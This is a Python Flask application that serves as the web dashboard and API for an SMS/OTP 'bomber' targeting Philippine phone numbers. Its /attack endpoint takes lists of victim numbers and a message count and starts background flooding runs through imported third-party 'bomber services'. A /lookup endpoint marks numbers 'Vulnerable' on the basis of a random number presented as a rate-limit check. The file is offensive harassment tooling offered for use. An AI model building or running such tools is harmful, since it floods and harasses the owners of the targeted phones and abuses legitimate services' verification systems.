from flask import Flask, request, jsonify, render_template, session, redirect, url_for
import asyncio
import threading
from functools import wraps
from utils.config import config
from utils.logger import logger
from core.engine import Engine
from services.bomber_services import get_default_services
import re
import os

import gc

app = Flask(__name__)
app.secret_key = config.SESSION_SECRET

# Global Engine and State
services = get_default_services()
engine = Engine(services)
attack_state = {
    "active": False,
    "success": 0,
    "failed": 0,
    "logs": [],
    "lock": threading.Lock()
}

@app.route('/')
def dashboard():
    return render_template('dashboard.html', services=services)

@app.route('/attack', methods=['POST'])
def start_attack():
    data = request.json
    phone_raw = data.get('phone', '')
    amount = int(data.get('amount', 100))
    selected_services = data.get('services')

    # Parse multiple phone numbers
    phones = [p.strip() for p in re.split(r'[,\n\r\s]+', phone_raw) if p.strip()]
    
    if not phones:
        return jsonify({"success": False, "error": "No valid phone numbers provided"}), 400

    valid_phones = []
    for phone in phones:
        if re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', phone.replace(' ', '')):
            valid_phones.append(phone)
    
    if not valid_phones:
        return jsonify({"success": False, "error": "Invalid phone format(s)"}), 400

    with attack_state["lock"]:
        if attack_state["active"]:
            return jsonify({"success": False, "error": "An attack is already in progress"}), 429
        
        attack_state["active"] = True
        attack_state["success"] = 0
        attack_state["failed"] = 0
        attack_state["logs"] = []

    # Run in background
    def run_in_bg():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def progress_callback(batch, total, success, failed):
            with attack_state["lock"]:
                attack_state["success"] += success
                attack_state["failed"] += failed
                attack_state["logs"].append({
                    "msg": f"Batch {batch}/{total}: {success} OK, {failed} FAIL",
                    "type": "info"
                })

        try:
            loop.run_until_complete(engine.run_attack(
                valid_phones, amount, selected_services, on_progress=progress_callback
            ))
        except Exception as e:
            logger.exception("Background attack failed")
            with attack_state["lock"]:
                attack_state["logs"].append({"msg": f"Critical Error: {str(e)}", "type": "error"})
        finally:
            with attack_state["lock"]:
                attack_state["active"] = False
            loop.close()
            gc.collect()

    thread = threading.Thread(target=run_in_bg)
    thread.start()
    
    return jsonify({"success": True})

@app.route('/status')
def get_status():
    with attack_state["lock"]:
        logs = attack_state["logs"]
        attack_state["logs"] = [] # Clear logs after sending
        return jsonify({
            "active": attack_state["active"],
            "success": attack_state["success"],
            "failed": attack_state["failed"],
            "logs": logs
        })

@app.route('/lookup/<phone>')
def lookup_phone(phone):
    phone = phone.strip().replace(' ', '').replace('+', '')
    if phone.startswith('63'):
        phone = '0' + phone[2:]
    
    # Basic validation
    if not re.match(r'^09\d{9}$', phone):
        return jsonify({"error": "Invalid PH number"}), 400
        
    prefix = phone[:4]
    carrier = config.CARRIER_PREFIXES.get(prefix, "Unknown / International")
    
    # Realistic Rate Limit Simulation (based on common bombing targets)
    # In a real app, this could check a database of recent attacks
    import random
    is_limited = random.random() < 0.15
    
    return jsonify({
        "phone": phone,
        "prefix": prefix,
        "carrier": carrier,
        "limited": is_limited,
        "region": "Philippines (PH)",
        "status": "Vulnerable" if not is_limited else "Rate Limited (High Defense)"
    })

@app.route('/health')
def health_check():
    return jsonify({
        "status": "healthy",
        "services_loaded": len(services),
        "engine_active": engine._session is not None and not engine._session.closed
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
